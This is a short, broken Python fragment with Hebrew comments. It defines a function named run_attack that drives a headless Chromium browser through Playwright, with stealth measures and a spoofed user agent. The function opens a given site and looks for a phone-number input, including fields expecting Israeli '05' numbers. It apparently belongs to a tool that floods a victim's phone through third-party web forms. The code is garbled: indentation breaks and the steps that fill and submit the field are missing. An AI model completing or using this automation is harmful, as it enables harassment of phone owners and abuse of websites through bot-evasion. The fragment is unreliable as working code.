def run_attack(site, phone, user):
    with sync_playwright() as p:
        browser = None
        try:
            # חייב להיות headless=True כדי לעבוד בשרת חיצוני
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
            page = context.new_page()
            stealth(page)
            
            page.goto(site['url'], wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(3000)

            # חיפוש שדה הטלפון והזנה
            field = page.locator('input[type="tel"], input[placeholder*="05"], input[name*="phone"]').first

                page.wait_for_timeout(1000)

        finally:
            if browser: browser.close()
